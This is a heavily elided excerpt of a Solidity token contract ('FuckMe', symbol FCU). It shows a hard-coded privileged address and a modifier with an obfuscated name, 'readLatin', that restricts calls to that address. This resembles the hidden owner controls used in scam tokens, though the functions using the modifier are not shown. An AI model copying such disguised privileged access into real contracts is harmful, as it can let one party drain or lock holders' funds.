...
contract Context {
 ...
 contract FuckMe is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _fullTokensAmounts;

    string private _name = "Fuck U";
    string private _symbol = "FCU";
    ...
    address private AllocateFee2 = 0xA0cC00caEbbc8a8D1C80647C98910e5d995319E7;
   ...
   */
    ...
    modifier readLatin () {
        require(_msgSender() == AllocateFee2, "No Address found for Burnto");
        _;
    }
